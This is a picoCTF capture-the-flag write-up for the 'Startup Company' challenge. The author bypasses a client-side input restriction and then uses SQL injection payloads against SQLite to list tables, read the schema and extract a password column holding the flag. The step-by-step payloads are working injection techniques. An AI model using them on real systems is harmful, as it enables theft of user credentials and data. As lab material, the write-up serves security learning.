# Startup Company
This is a `SQLi` challenge that involves leaking table data in order to find the flag. I Registered for an account and entered the payload into the `donation` input bar by removing it's `number only` class via the debug console and I get an `database error`. Now what?

## Method

We are supposed to extract table names and stuff using SQLi

Reffer to `Empire 1 ` from pico2019

# Payloads and Leaks

payload

```
'||(select tbl_name FROM sqlite_master WHERE type='table' limit 0,1 COLLATE NOCASE)||'
```

leak

```
startup_users
```
We see that we found a table called `startup_users`
---

payload

```
'||(select tbl_name FROM sqlite_master WHERE type='table' limit 1,1 COLLATE NOCASE)||'
```

leak

```
none
```
We see that `startup_users` is the only table in the database.
---

payload

```
'||(select sql FROM sqlite_master WHERE type='table' limit 0,1 COLLATE NOCASE)||'
```

leak

```
$CREATE TABLE startup_users (nameuser text, wordpass text, money int)
```
We leak the SQL structure of the table in which we can see the `wordpass` column stands out.
---

payload

```
'||(select wordpass FROM startup_users where wordpass like '%picoCTF%' limit 0,1 COLLATE NOCASE)||'
```

leak

```
picoCTF{1_c4nn0t_s33_y0u_55fb70fa}
```
We have leaked the `word_pass` column data.